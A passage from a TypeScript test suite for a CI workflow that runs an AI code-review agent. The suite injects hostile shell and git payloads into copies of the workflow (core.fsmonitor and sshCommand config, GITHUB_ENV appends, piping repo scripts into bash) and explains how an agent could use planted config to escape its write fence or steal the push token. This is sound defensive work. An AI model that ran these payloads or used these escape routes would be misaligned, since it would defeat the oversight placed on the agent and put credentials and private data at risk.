    // via a `hooks` block, with `Bash` and every write tool denied.
    const unquoted = src.replace(/^( {12}--model )"(\$\{\{[^\n]*\}\})"$/m, '$1$2');
    expect(unquoted, 'the model expansion is no longer quoted or the anchor moved').not.toBe(src);
    expect(() => assertArgSurface(claudeArgTokens(unquoted, MULTI_WORD_EXPANSION))).toThrow();
  });

  it('never runs repo-tracked code out of the checkout', () => {
    // The fence above bounds what the agent may edit; this bounds what the job may
    // execute, which is the half that does not depend on the permission system holding.
    // A tracked file run from the tree is code execution in THIS run, and the push
    // step's path guard cannot reach it: the guard only gates what gets COMMITTED, and
    // on a run that posts no review it does not run at all.
    expect(checkoutCodeReferences(src)).toEqual([]);

    // POSITIVE CONTROL. This assertion has now been wrong twice - once vacuously (a check
    // for a string that appears nowhere in the file) and once by reading 2 of YAML's 7
    // `run:` scalar forms and only interpreter-led invocations. So it proves itself: every
    // shape below is injected into a copy of the workflow and has to be caught, across
    // every block-scalar style. Add to this list rather than trusting the regex.
    const shouldBeCaught = [
      'bash ./scripts/check-no-control-bytes.sh',
      './scripts/install-hooks.sh',
      './dev --check',
      '. ./scripts/env.sh',
      'source scripts/env.sh',
      'make -f build/Makefile ci',
      'eval "$(cat scripts/env.sh)"',
      'RUNNER=node ; $RUNNER scripts/codegen.js',
      'S=scripts/x.sh ; bash "$S"',
      'node "$RUNNER_TEMP/x.js"',
      'exec 3< scripts/x.sh; bash <&3',
      'python3 .github/scripts/redact-review-transcript.py a b c',
      'node "$GITHUB_WORKSPACE/x.js"',
      'npx tsx packages/scripts/src/x.ts',
      // A pipe is the same execution written as two individually harmless commands, and
      // reaches it without naming an interpreter at all in the `xargs` form.
      'cat ./scripts/install-hooks.sh | bash',
      'echo ./scripts/install-hooks.sh | xargs bash',
      'sed -n "1,99p" ./scripts/x.sh | sh',
      'bash <<< "$(cat ./scripts/install-hooks.sh)"',
      // Out of the object store rather than out of the tree. `HEAD:` used to be exempt for
      // every path, on the reasoning that the store holds bytes no write tool reaches - true
      // only until `git commit`, after which HEAD is the agent's own fold commit. `cat-file -p`
      // is the same read spelled the way anyone actually writes it.
      'git show HEAD:scripts/check-no-control-bytes.sh | bash',
      'git cat-file -p HEAD:scripts/check-no-control-bytes.sh | bash',
      // No slash anywhere. The step's CWD is the checkout and `bash` opens a script operand
      // relative to CWD before consulting $PATH, so a tracked repo-root file needs neither a
      // `./` nor an exec bit to be executed.
      'bash dev',
      'sh install-hooks.sh',
      'node commitlint.config.js',
      // `${S}` rather than `"$S"`: the braces used to split the word so that no word carried
      // the reference the taint tracking looks for.
      'S=./scripts/install-hooks.sh ; bash ${S}',
    ];
    // Every step SHAPE too. YAML does not care how a list item is spaced, so `-   name:` puts
    // the step's keys at column 10 and its body deeper - and every sweep in this file used to
    // key on the six/eight/ten columns this workflow happens to use, so one oddly-indented step
    // was invisible to all of them at once. `name:` is also OPTIONAL, which puts the dash on the
    // `run:` line itself; that shape defeated this sweep, the push sweep, the `git add` pin and
    // the `python3` pin simultaneously, and unlike the odd indent prettier returns it unchanged.
    const shapes = [
      (indicator: string, body: string) =>
        `      - name: Warm the toolchain\n        run: ${indicator}\n          ${body}`,
      (indicator: string, body: string) =>
        `      -   name: Warm the toolchain\n          run: ${indicator}\n            ${body}`,
      (indicator: string, body: string) => `      - run: ${indicator}\n          ${body}`,
    ];
    for (const shape of shapes) {
      // Every block header YAML allows, not the five that were guessed: the chomping and
      // indentation indicators may appear in EITHER order and a comment may follow either.
      // `| # c`, `|2-` and `|+ # c` each parse to the same step as `|` and each made the
      // body invisible to this sweep, the push sweep, the staging pin and the `python3` pin
      // simultaneously.
      for (const indicator of ['|', '|-', '|+', '>', '>-', '|2', '| # stage the tree', '|2-', '|+ # c']) {
        for (const body of shouldBeCaught) {
          const injected = src.replace(
            /^ {6}- name: Report skill-fetch failure$/m,
            `${shape(indicator, body)}\n      - name: Report skill-fetch failure`
          );
          expect(injected, 'the injection anchor moved').not.toBe(src);
          expect(checkoutCodeReferences(injected), `not caught under \`run: ${indicator}\`: ${body}`).not.toEqual([]);
        }
      }
    }
    // A plain scalar wraps onto the following lines with no indicator at all, and reads as
    // one value with the line break folded to a space - so the body is split across two lines
    // and neither of the indicator arms above sees it.
    for (const body of shouldBeCaught) {
      const cut = body.indexOf(' ');
      const wrapped = `      - name: Warm the toolchain\n        run: ${body.slice(0, cut)}\n          ${body.slice(cut + 1)}`;
      const injected = src.replace(
        /^ {6}- name: Report skill-fetch failure$/m,
        `${wrapped}\n      - name: Report skill-fetch failure`
      );
      expect(injected, 'the injection anchor moved').not.toBe(src);
      expect(checkoutCodeReferences(injected), `not caught as a wrapped plain scalar: ${body}`).not.toEqual([]);
    }
    // And the one-line forms, named and not, which take no block indicator at all.
    for (const head of ['      - name: Warm the toolchain\n        run: ', '      - run: ']) {
      for (const body of shouldBeCaught) {
        const injected = src.replace(
          /^ {6}- name: Report skill-fetch failure$/m,
          `${head}${body}\n      - name: Report skill-fetch failure`
        );
        expect(injected, 'the injection anchor moved').not.toBe(src);
        expect(checkoutCodeReferences(injected), `not caught as a one-line run:: ${body}`).not.toEqual([]);
      }
    }
    // POSITION in the body is the other axis, and the one that mattered most: a newline used
    // to end a WORD rather than a command, so the lines of a body ran together into a single
    // command whose program was the body's first word. A body opening `set -euo pipefail` or
    // `git ...` therefore had everything after it skipped as a data-only command's arguments.
    // These are injected INSIDE `Push fold commit` - upstream of the path guard, in the step
    // that holds the push token - which is where it is worth the least to be blind.
    // Two positions inside `Push fold commit`, because they differ in what `HEAD` MEANS. Before
    // `git add -u`, HEAD is the reviewed commit; after the `git commit` below it is the agent's
    // own fold commit, so a `git show HEAD:<path>` there reads back exactly what the agent just
    // wrote - which is why the exemption is one object path and not the `HEAD:` prefix.
    for (const anchor of [/^ {10}git add -u$/m, /^ {12}-m "Workflow run: .*$/m]) {
      for (const body of shouldBeCaught) {
        const injected = src.replace(anchor, line => `${line}\n          ${body}`);
        expect(injected, 'the injection anchor moved').not.toBe(src);
        expect(checkoutCodeReferences(injected), `not caught inside an existing body: ${body}`).not.toEqual([]);
      }
    }
    // Composite actions in this repo are tracked files too, and `uses:` is not a `run:`.
    expect(src).not.toMatch(/uses: \.\//);
  });

  it('feeds the transcript redactor from the object store at the point of use', () => {
    // `Redact and upload review transcript` EXECUTES the redactor, on the
    // `posted != 'true'` branch - exactly where the push step's path guard never runs.
    // So the bytes are read out of the commit and piped straight into the interpreter:
    // there is no file on disk for anything to have pre-written, in the checkout or in
    // $RUNNER_TEMP. Staging a copy to a file BEFORE the agent ran was the previous
    // shape, and it moved the executed file out of the repo and out of the write fence.
    const transcript = withoutComments(step(src, 'Redact and upload review transcript'));
    expect(transcript).toMatch(
      /git show HEAD:\.github\/scripts\/redact-review-transcript\.py \|\n\s*python3 -I - "\$EXECUTION_FILE" "\$SKILL_FILE" "\$DEST"/
    );
    // Every python3 the job runs, pinned as a whole invocation rather than as its first
    // word. Two properties ride on the argv and a `python3 \S+` sweep sees neither: the
    // program comes from stdin (`-`), because a path argument is a FILE and a file is
    // something that can be written before this step runs; and the interpreter is isolated
    // (`-I`), because `python3 -` puts the process CWD - $GITHUB_WORKSPACE, the checkout the
    // agent holds Edit on - at `sys.path[0]`, so a planted `./json.py` wins the redactor's
    // own `import json`. Authenticating the program's bytes says nothing about either.
    // By PARSED invocation, not by a line scan. `match(/python3[^\n]*/g)` is non-overlapping, so
    // `; python3 -c "import os"` appended to the shipped line was INSIDE the first match and then
    // deleted by the `.replace(/;.*$/,'')` - the second interpreter was invisible, and arbitrary
    // Python without `-I`, with its program from `-c` rather than from the authenticated object
    // store, ran in the step holding the full agent transcript. The same words joined with `&&`
    // were caught, which is what isolated the separator. The program set is the bound, so it is
    // read as programs.
    expect(commandsNamed(src, /^python3$/)).toEqual([
      ['python3', '-I', '-', '$EXECUTION_FILE', '$SKILL_FILE', '$DEST'],
    ]);
    // POSITIVE CONTROL along that axis, off the shipped invocation: one mutation GLUES a second
    // interpreter on after a `;` - the shape the old scan consumed and then deleted - and one
    // adds it as its own command, which the old scan caught. The pair is what isolates the
    // separator as the cause rather than the second interpreter.
    const shippedPython = /^( {17}python3 -I - "\$EXECUTION_FILE" "\$SKILL_FILE" "\$DEST"; then\n)/m;
    expect(src, 'the python3 invocation anchor moved').toMatch(shippedPython);
    for (const glued of [true, false]) {
      const injected = src.replace(shippedPython, (_whole, line: string) =>
        glued
          ? line.replace('; then', '; python3 -c "import os"; then')
          : `${line}                 python3 -c "import os"\n`
      );
      expect(injected, `the python3 injection anchor moved (glued=${glued})`).not.toBe(src);
      expect(commandsNamed(injected, /^python3$/).length, `a second python3 was not seen (glued=${glued})`).toBe(2);
    }
    // The redactor derives the strings it strips by READING the skill file, so that file
    // is the redaction list, and it lives in the unfenced-by-default $RUNNER_TEMP. It is
    // checked against a hash taken before the agent ran; without this the private skill
    // passes through the transcript in the clear and gets published as a world-readable
    // artifact on a public repo, with no code execution needed.
    expect(withoutComments(step(src, 'Fetch bot-review skill from b4m-devtools'))).toMatch(
      /echo "skill_sha=\$\(sha256sum "\$DEST" \| cut -d' ' -f1\)" >> "\$GITHUB_OUTPUT"/
    );
    expect(transcript).toMatch(/^ {10}SKILL_SHA: \$\{\{ steps\.skill_fetch\.outputs\.skill_sha \}\}$/m);
    const hashGate = transcript.match(
      /^ {10}if \[ -z "\$SKILL_SHA" \] \|\| \[ "\$\(sha256sum "\$SKILL_FILE" \| cut -d' ' -f1\)" != "\$SKILL_SHA" \]; then\n[\s\S]*?^ {10}fi$/m
    )?.[0];
    expect(hashGate, 'the transcript step does not check the skill file against its fetch hash').toBeTruthy();
    // Fail CLOSED: no upload, rather than an upload redacted against the wrong list.
    expect(hashGate).toMatch(/^ {12}echo "uploadable=false" >> "\$GITHUB_OUTPUT"$/m);
    expect(hashGate).toMatch(/^ {12}exit 0$/m);
    // And it has to run before the redactor, not after it.
    expect(transcript.indexOf('-z "$SKILL_SHA"')).toBeLessThan(transcript.indexOf('git show HEAD:'));

    // Belt to `-I`, kept because the two are independent and `-I` is one edit from gone:
    // CPython's `site` imports `usercustomize` from `$HOME/.local/lib/pythonX.Y/
    // site-packages` before it reads stdin, and an imported `.py` needs no execute bit, so a
    // 0644 file the agent wrote there executes ahead of the redactor - with this step's env,
    // which carries SKILL_FILE - on exactly the `posted != 'true'` branch where nothing else
    // in the job inspects anything. `$HOME` cannot be write-fenced (the checkout is under it
    // on a hosted runner), so the bound is here. `-E` does NOT cover this on its own.
    expect(step(src, 'Redact and upload review transcript')).toMatch(/^ {10}PYTHONNOUSERSITE: '1'$/m);
  });

  it('uploads the redacted transcript and only when redaction succeeded', () => {
    // The workflow closed this route; the test never covered it. Repointing `path:` at
    // `steps.bot_review.outputs.execution_file` publishes the RAW transcript - the private
    // b4m-devtools skill in the clear, as a world-downloadable artifact on a public repo -
    // and `if: always()` publishes it on exactly the runs where the hash gate refused. Both
    // are one-line edits that defeat the redaction design without touching the redactor.
    const dest = step(src, 'Redact and upload review transcript').match(/^ {10}DEST: (.*)$/m)?.[1];
    expect(dest, 'the transcript step declares no DEST').toBeTruthy();
    const upload = step(src, 'Upload review transcript');
    expect(upload.match(/^ {10}path: (.*)$/m)?.[1]).toBe(dest);
    expect(upload).not.toMatch(/execution_file/);
    expect(ifLine(src, 'Upload review transcript')).toBe("always() && steps.transcript.outputs.uploadable == 'true'");
  });

  it('measures a posted review from the API, fail-closed', () => {
    // Executed, not matched. `posted` is the antecedent of the entire write path - the mint,
    // the push, the path guard and the size bound are all downstream of it - and four
    // one-token edits inside the step (`-gt 0` -> `-ge 0`, either `emit false` -> `emit true`,
    // dropping the outcome conjunct from the `if:`) make it unconditionally true while every
    // consumer gate stays correctly spelled. Nothing else in the repo can see that.
    expect(runPostedCheck(src, {})).toBe('false');
    expect(runPostedCheck(src, { reviews: [{}] })).toBe('true');
    expect(runPostedCheck(src, { inline: [{}, {}, {}] })).toBe('true');
    expect(runPostedCheck(src, { issue: [{}] })).toBe('true');
    // The two halves of the selector, run through the real jq rather than asserted as text.
    // Someone ELSE's review on the PR is not this run's review...
    expect(runPostedCheck(src, { reviews: [{ login: 'someone-else' }] })).toBe('false');
    expect(runPostedCheck(src, { issue: [{ login: 'dependabot[bot]' }] })).toBe('false');
    // All three endpoints, because each is a separate selector string: the inline one had no
    // negative-login fixture, so a login filter dropped from it alone stayed green.
    expect(runPostedCheck(src, { inline: [{ login: 'someone-else' }] })).toBe('false');
    // ...nor is the bot's own review from before this run started. This is the arm a widened
    // watermark disarms, and it passes for the wrong reason unless the compare actually runs.
    expect(runPostedCheck(src, { reviews: [{ at: '2025-12-31T23:59:59Z' }] })).toBe('false');
    // Both selectors, because they are separate strings comparing separate timestamp fields:
    // widening only the comment one left the review fixture above green on its own.
    expect(runPostedCheck(src, { issue: [{ at: '2025-12-31T23:59:59Z' }] })).toBe('false');
    expect(runPostedCheck(src, { inline: [{ at: '2025-12-31T23:59:59Z' }] })).toBe('false');
    // A review the bot OPENED but never submitted has `submitted_at: null`, which is `>= SINCE`
    // in neither jq nor this shell; the selector's explicit null arm is what makes that so.
    expect(runPostedCheck(src, { reviews: [{ at: null }] })).toBe('false');
    // No watermark means no way to tell this run's review from an older one: not posted.
    expect(runPostedCheck(src, { since: '', reviews: [{}, {}, {}, {}, {}] })).toBe('false');
    // An API failure must not read as a review. This is the arm that turns a transient
    // outage into a push on a run that reviewed nothing.
    expect(runPostedCheck(src, { apiStatus: 1, reviews: [{}, {}, {}, {}, {}] })).toBe('false');
    // And the measurement has to happen on the runs that need measuring - a step-level
    // gate that skips it leaves `posted` empty, which the consumers read as not-posted,
    // but one that WIDENS it lets a size-guard-skipped run be measured as reviewed.
    expect(ifLine(src, 'Verify a review was actually posted')).toBe(
      "always() && (steps.bot_review.outcome == 'success' || steps.bot_review.outcome == 'failure')"
    );

    // The fixtures above supply both variables the body reads, so the workflow's own bindings
    // are the one part of this measurement never on the execution path - pinned here for the
    // reason HEAD_REF is pinned below. The asymmetry is what makes it worth a line: an EMPTY
    // watermark fails closed and is covered by the fixture above, while a PAST CONSTANT fails
    // OPEN, and one stale `claude[bot]` review on the PR then reads as this run's.
    const postedStep = step(src, 'Verify a review was actually posted');
    expect(postedStep).toMatch(/^ {10}BOT_REVIEW_LOGIN: 'claude\[bot\]'$/m);
    expect(postedStep).toMatch(/^ {10}SINCE: \$\{\{ steps\.review_start\.outputs\.at \}\}$/m);
    // And the watermark's own PRODUCER, which is the last unpinned link in that chain: widening
    // `1 second ago` to `30 days ago` leaves every assertion above green while making one stale
    // `claude[bot]` review anywhere on the PR read as this run's, i.e. fail-open at the
    // antecedent of the whole write path.
    expect(withoutComments(step(src, 'Record review start time'))).toMatch(
      /^ {10}echo "at=\$\(date -u -d '1 second ago' \+%Y-%m-%dT%H:%M:%SZ\)" >> "\$GITHUB_OUTPUT"$/m
    );
  });

  it('runs git after the agent with no config the agent could have planted', () => {
    // $HOME is neither the checkout nor $RUNNER_TEMP, so no write fence covers it, and a
    // global git config is command execution: `filter.<x>.clean` runs through a shell
    // during `git add -u`, driven by a working-tree `.gitattributes` that need not be
    // tracked and so never reaches the path guard. `git add` still exits 0, so
    // `set -euo pipefail` does not catch it - and this is all UPSTREAM of the path guard,
    // the size bound and --no-verify. The same file also reaches `http.proxy` and
    // `url.<base>.insteadOf`, either of which hands the push token to a chosen host.
    //
    // The set is DERIVED from position, not listed. It used to be two hardcoded step names, so
    // the invariant was a property of those two names rather than of running git after the agent
    // reading untrusted text: a `git log --oneline -1` added to any later step ran with whatever
    // `$HOME` config the agent had planted and nothing here looked. Every step whose body invokes
    // git, at or after the agent, is swept; every one before it is upstream of the agent and has
    // no planted config to worry about. The names are pinned by value as well, so a new
    // post-agent git step is a deliberate edit rather than a silent addition.
    const steps = stepChunks(src);
    const agentIndex = steps.findIndex(({ name }) => name === 'Run /bot-review');
    expect(agentIndex, 'the agent step moved').toBeGreaterThan(-1);
    const postAgentGit = steps.filter(({ body }, index) => index > agentIndex && gitInvocations(body).length > 0);
    expect(postAgentGit.map(({ name }) => name)).toEqual(['Push fold commit', 'Redact and upload review transcript']);
    for (const { name, body: stepSrc } of postAgentGit) {
      expect(stepSrc, `${name}: no GIT_CONFIG_GLOBAL`).toMatch(/^ {10}GIT_CONFIG_GLOBAL: \/dev\/null$/m);
      expect(stepSrc, `${name}: no GIT_CONFIG_SYSTEM`).toMatch(/^ {10}GIT_CONFIG_SYSTEM: \/dev\/null$/m);
      expect(stepSrc, `${name}: no GIT_CONFIG_NOSYSTEM`).toMatch(/^ {10}GIT_CONFIG_NOSYSTEM: '1'$/m);
      // Those three name config FILES. The numbered environment spelling carries the config
      // itself, is not a file, and reaches the same execution: measured on git 2.50.1 with all
      // three of the above in force, `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor
      // GIT_CONFIG_VALUE_0='sh -c ...'` ran the command on the shipped `ls-files` line.
      expect(stepSrc, `${name}: no GIT_CONFIG_COUNT`).toMatch(/^ {10}GIT_CONFIG_COUNT: '0'$/m);
      // And the spelling the count does not govern either. `GIT_CONFIG_PARAMETERS` is git's own
      // channel for handing `-c` config to a subprocess: not a file, not numbered, read straight
      // out of the environment. Measured on git 2.50.1 with all four of the above in force, a
      // `core.fsmonitor` payload in it ran on the shipped `ls-files` line and the step exited 0;
      // pinned empty it does nothing, and a command-line `-c` still applies and still reaches
      // child git processes. Its delivery route is bounded separately - see the runner
      // file-command sweep, which does not rest on Actions env precedence.
      expect(stepSrc, `${name}: no GIT_CONFIG_PARAMETERS`).toMatch(/^ {10}GIT_CONFIG_PARAMETERS: ''$/m);
    }
    // POSITIVE CONTROL for the derivation, on the axis the two-name list was blind to: the same
    // invocation in a step nobody thought to name. It has to arrive as a THIRD post-agent git
    // step, and to arrive without the five vars - which is the whole of the failure above.
    const plantedGit = src.replace(
      /^ {6}- name: Report skill-fetch failure$/m,
      `      - name: Summarise the fold\n        run: |\n          git log --oneline -1\n      - name: Report skill-fetch failure`
    );
    expect(plantedGit, 'the injection anchor moved').not.toBe(src);
    const plantedSteps = stepChunks(plantedGit);
    const plantedAgent = plantedSteps.findIndex(({ name }) => name === 'Run /bot-review');
    const plantedPostAgent = plantedSteps.filter(
      ({ body }, index) => index > plantedAgent && gitInvocations(body).length > 0
    );
    expect(plantedPostAgent.map(({ name }) => name)).toContain('Summarise the fold');
    expect(plantedPostAgent.find(({ name }) => name === 'Summarise the fold')?.body).not.toMatch(/GIT_CONFIG_GLOBAL/);
    // And the whole `env:` KEY SET of both, by value. The line above only asserts that
    // `GIT_CONFIG_COUNT: '0'` is PRESENT, which stays true while `GIT_CONFIG_KEY_0` and
    // `GIT_CONFIG_VALUE_0` are added beside it - and an env edit changes what the `run:` body
    // executes without changing one byte of that body, so every body-shaped sweep in this file
    // is structurally unable to see it. A new key here has to be justified.
    expect(envKeys(src, 'Push fold commit')).toEqual(PUSH_STEP_ENV_KEYS);
    // POSITIVE CONTROL for both pins, on the axis the attack uses: the added keys are
    // `GIT_CONFIG_KEY_0`/`VALUE_0`, so a sweep whose key charset stops at letters reads the
    // shipped set unchanged and bounds nothing.
    const plantedKey = src.replace(
      '          PUSH_TOKEN: ${{ steps.push_token.outputs.token }}\n',
      '          PUSH_TOKEN: ${{ steps.push_token.outputs.token }}\n          GIT_CONFIG_KEY_0: core.fsmonitor\n'
    );
    expect(plantedKey, 'the env injection anchor moved').not.toBe(src);
    expect(envKeys(plantedKey, 'Push fold commit')).toContain('GIT_CONFIG_KEY_0');
    expect(envKeys(src, 'Redact and upload review transcript')).toEqual([
      'EXECUTION_FILE',
      'SKILL_FILE',
      'SKILL_SHA',
      'DEST',
      'GIT_CONFIG_GLOBAL',
      'GIT_CONFIG_SYSTEM',
      'GIT_CONFIG_NOSYSTEM',
      'GIT_CONFIG_COUNT',
      'GIT_CONFIG_PARAMETERS',
      'PYTHONNOUSERSITE',
    ]);
    // Every git config key set on a COMMAND LINE anywhere in the file, by value. See
    // `gitConfigKeys`: `-c` is config that no config-file nulling touches, and a key like
    // `core.fsmonitor` or `diff.external` is a command git runs. All five that ship are inert
    // knobs whose job is to stop git reading something the agent could have planted.
    expect(gitConfigKeys(src)).toEqual(GIT_CONFIG_KEYS);
    // POSITIVE CONTROL for that pin, one spelling per route: a by-value `toEqual` is only a
    // bound if a sixth key actually reaches it.
    for (const injected of [
      `git -c diff.external='sh -c :' diff --ext-diff HEAD -- .`,
      `git -c core.fsmonitor='sh -c :' ls-files --others --exclude-standard`,
      `git --config-env=core.sshCommand=EVIL push origin HEAD:main`,
      `git --config-env core.sshCommand=EVIL push origin HEAD:main`,
      `'env' git -c uploadpack.packObjectsHook='sh -c :' ls-files --others`,
    ]) {
      const mutated = src.replace(
        /^ {6}- name: Report skill-fetch failure$/m,
        `      - name: Publish the fold\n        run: |\n          ${injected}\n      - name: Report skill-fetch failure`
      );
      expect(mutated, 'the injection anchor moved').not.toBe(src);
      expect(gitConfigKeys(mutated), `a git config key was not seen: ${injected}`).toHaveLength(6);
    }
    // A further spelling that neither of the two pins above can see: the config carried in a
    // command's OWN environment as an assignment prefix. Empty, and a prefix that is not empty
    // has to be justified here - `GIT_CONFIG_COUNT=1 ... git ls-files` overrides the step env
    // (measured), and `commandProgram` strips the assignments, so it parses as plain `git`.
    // Not the end of the list: `GIT_CONFIG_PARAMETERS` is a spelling that arrives from an
    // earlier step, pinned empty above and bounded at its delivery route by the runner
    // file-command sweep.
    expect(envAssignmentPrefixes(src)).toEqual([]);
    for (const [prefix, expected] of [
      // POSITIVE CONTROLS, one per position the assignments may occupy. The first is the plain
      // form. The second puts a COMMAND_PREFIX word in FRONT of them - the same command with the
      // same environment, and the one a loop that stopped at word 0 read as no assignment at
      // all: `commandProgram` strips `env` too, so the command still parsed as an allowlisted
      // `git` and nothing named it.
      ['', ['GIT_CONFIG_COUNT', 'GIT_CONFIG_KEY_0']],
      ['env ', ['GIT_CONFIG_COUNT', 'GIT_CONFIG_KEY_0']],
      // And the quoted prefix, for the reason `commandProgram` normalizes before it tests.
      ["'env' ", ['GIT_CONFIG_COUNT', 'GIT_CONFIG_KEY_0']],
      // A SHELL_PREFIX word that heads a command with NO program in it is deliberately NOT
      // skipped: `for` is in `SHELL_PREFIX` but not in `COMMAND_PREFIX`, so the loop stops
      // there - which is what keeps a loop variable from being reported as an assignment.
      ['for ', []],
    ] as Array<[string, string[]]>) {
      const mutated = src.replace(
        /^ {6}- name: Report skill-fetch failure$/m,
        `      - name: Publish the fold\n        run: |\n          ${prefix}GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor git ls-files\n      - name: Report skill-fetch failure`
      );
      expect(mutated, 'the injection anchor moved').not.toBe(src);
      expect(envAssignmentPrefixes(mutated), `an environment assignment prefix was not seen: ${prefix}`).toEqual(
        expected
      );
    }
    // With the global config nulled, `git config user.email` would write to /dev/null and
    // the commit would come out unattributed - which cla.yml and main-protection both key
    // off. Identity has to be passed per-invocation instead.
    const commands = withoutComments(step(src, 'Push fold commit'));
    expect(commands).not.toMatch(/git config/);
    expect(commands).toMatch(
      /git -c user\.name='claude\[bot\]' \\\n\s*-c user\.email='claude\[bot\]@users\.noreply\.github\.com' \\\n\s*commit /
    );
  });

  it('never writes the runner file commands, and runs exactly the steps it says it does', () => {
    // $GITHUB_ENV and $GITHUB_PATH set the environment, and the PATH, of every LATER step. That
    // makes a one-line append inside an ordinary body a way to change what a fully guarded step
    // executes without touching that step at all - and no `env:` key pin in this file can see
    // it, because the channel never touches an `env:` block. Proven live, not argued: with all
    // four GIT_CONFIG_* vars in force, `GIT_CONFIG_PARAMETERS` delivered this way ran a command
    // on the shipped `git ls-files` line in the step holding PUSH_TOKEN and exited 0.
    //
    // The shipped set of redirect targets is six, all of them the job's own step outputs, its
    // own scratch files or /dev/null, which is the tightest allowlist available here.
    expect(runnerFileWrites(src)).toEqual({
      targets: REDIRECTION_TARGETS,
      mentions: [],
      expansions: [],
      indirect: [],
      reassignments: [],
    });
    // POSITIVE CONTROLS, one per route. The first is the shape that was 28/28 green: one line
    // APPENDED to an existing body, no new step, no changed `env:` block, and `echo` is both an
    // allowlisted program and a data-only one, so every other sweep in this file reads the file
    // unchanged.
    const appended = src.replace(
      /^( +)(echo "at=\$\(date .*\n)/m,
      `$1$2$1echo "GIT_CONFIG_PARAMETERS='core.fsmonitor=sh -c :'" >> "$GITHUB_ENV"\n`
    );
    expect(appended, 'the append anchor moved').not.toBe(src);
    expect(redirectionTargets(appended), 'an appended redirection was not seen').toContain('"$GITHUB_ENV"');
    expect(runnerFileCommandMentions(appended)).not.toEqual([]);
    // Same variable, reached without a redirection at all.
    const teed = src.replace(/^( +)(echo "at=\$\(date .*\n)/m, `$1$2$1printf '%s\\\\n' "x" | tee -a "$GITHUB_PATH"\n`);
    expect(teed, 'the tee anchor moved').not.toBe(src);
    expect(runnerFileCommandMentions(teed), 'a non-redirection write was not seen').toEqual(['GITHUB_PATH']);
    // And the glued spelling, which is what a target-after-the-operator reader misses.
    const glued = src.replace(/^( +)(echo "at=\$\(date .*\n)/m, `$1$2$1echo x >>"$GITHUB_ENV"\n`);
    expect(glued, 'the glued anchor moved').not.toBe(src);
    expect(redirectionTargets(glued), 'a glued redirection target was not seen').toContain('"$GITHUB_ENV"');
    // THE REASSEMBLED ROUTE, which no spelling sweep can see: the name is never written down, so
    // `mentions` reads the body as clean and the redirection is to `$GITHUB_OUTPUT`, which the
    // target allowlist permits. `N` holds `GITHUB_ENV`'s value, and `$GITHUB_OUTPUT` is rebound to
    // it - so the append lands in the runner env file and sets a variable for every later step.
    // Both halves are asserted, because they are two independent writes: the reassignment of the
    // one trusted target name and the indirect expansion that reads the untrusted one.
    const reassembled = src.replace(
      /^( +)(echo "at=\$\(date .*\n)/m,
      `$1$2$1N=GITHUB_""ENV\n$1GITHUB_OUTPUT=\${!N}\n$1printf '%s\\\\n' 'BASH_ENV=/tmp/x.sh' >> "$GITHUB_OUTPUT"\n`
    );
    expect(reassembled, 'the reassembly anchor moved').not.toBe(src);
    expect(indirectExpansions(reassembled), 'an indirect expansion was not seen').toEqual(['${!}']);
    expect(runnerAssignments(reassembled), 'a rebinding of a runner variable was not seen').toEqual(['GITHUB_OUTPUT']);
    // The paired control: the shipped bytes read clean on BOTH new sweeps, so neither of them is
    // passing merely because the helper returns nothing for anything.
    expect(indirectExpansions(src)).toEqual([]);
    expect(runnerAssignments(src)).toEqual([]);
    // And a plain expansion of the same name is refused, which is the tighter statement - the
    // allowlist is one name, not "anything that is not GITHUB_ENV".
    const expanded = src.replace(/^( +)(echo "at=\$\(date .*\n)/m, `$1$2$1echo x >> "\${GITHUB_ENV}"\n`);
    expect(expanded, 'the expansion anchor moved').not.toBe(src);
    expect(runnerEnvRefs(expanded), 'a direct expansion of a runner variable was not seen').toEqual(['GITHUB_ENV']);

    // The step list itself, by value. Every sweep in this file runs over whatever steps exist,
    // so none of them can say "and no others" - a whole new step was 28/28 green, and the step
    // above is exactly what such a step would carry. Pinned the way the three key sets already
    // are, and for the same stated reason.
    expect(stepNames(src)).toEqual([
      'Checkout PR head',
      'Size guard - skip oversize PRs, pick review model',
      'Substantive-change guard - skip changeset-only re-reviews',
      'Note changeset-only skip on a manual re-review',
      'Mint b4m-devtools read token',
      'Fetch bot-review skill from b4m-devtools (fail loud)',
      'Record review start time',
      'Install bubblewrap',
      'Run /bot-review',
      'Verify a review was actually posted',
      'Mint fold push token (fold mode only)',
      'Push fold commit',
      'Report fold failure',
      'Report cancelled fold',
      'Report fold no-op',
      'Redact and upload review transcript',
      'Upload review transcript',
      'Report incomplete review',
      'Report skill-fetch failure',
      'Remove re-review label',
    ]);
    // Every step's `env:` KEY SET, as one map. See `stepEnvKeys`: this was read for exactly two
    // step NAMES, so the agent step - which declares no `env:` block at all - had nothing looking
    // at one, and any other step could take a key that overrides the job env pinned above. Both
    // are one-line escapes that change what a step executes without changing its body, which is
    // the one thing every body-shaped sweep in this file is structurally unable to see.
    expect(stepEnvKeys(src)).toEqual([
      ['Checkout PR head', []],
      ['Size guard - skip oversize PRs, pick review model', ['GH_TOKEN', 'PR', 'REPO']],
      [
        'Substantive-change guard - skip changeset-only re-reviews',
        ['GH_TOKEN', 'BOT_REVIEW_LOGIN', 'CHANGESET_BOT', 'PR', 'REPO'],
      ],
      ['Note changeset-only skip on a manual re-review', ['GH_TOKEN', 'PR', 'REPO']],
      ['Mint b4m-devtools read token', []],
      ['Fetch bot-review skill from b4m-devtools (fail loud)', ['GH_TOKEN', 'DEST', 'OWNER']],
      ['Record review start time', []],
      ['Install bubblewrap', []],
      ['Run /bot-review', []],
      ['Verify a review was actually posted', ['GH_TOKEN', 'BOT_REVIEW_LOGIN', 'SINCE', 'REPO', 'PR']],
      ['Mint fold push token (fold mode only)', []],
      ['Push fold commit', PUSH_STEP_ENV_KEYS],
      ['Report fold failure', ['GH_TOKEN', 'MINT_OUTCOME', 'PUSH_REASON', 'PR', 'REPO', 'SERVER_URL', 'RUN_ID']],
      ['Report cancelled fold', ['GH_TOKEN', 'PR', 'REPO', 'SERVER_URL', 'RUN_ID']],
      ['Report fold no-op', ['GH_TOKEN', 'PUSHED', 'DROPPED', 'PR', 'REPO', 'SERVER_URL', 'RUN_ID']],
      [
        'Redact and upload review transcript',
        [
          'EXECUTION_FILE',
          'SKILL_FILE',
          'SKILL_SHA',
          'DEST',
          'GIT_CONFIG_GLOBAL',
          'GIT_CONFIG_SYSTEM',
          'GIT_CONFIG_NOSYSTEM',
          'GIT_CONFIG_COUNT',
          'GIT_CONFIG_PARAMETERS',
          'PYTHONNOUSERSITE',
        ],
      ],
      ['Upload review transcript', []],
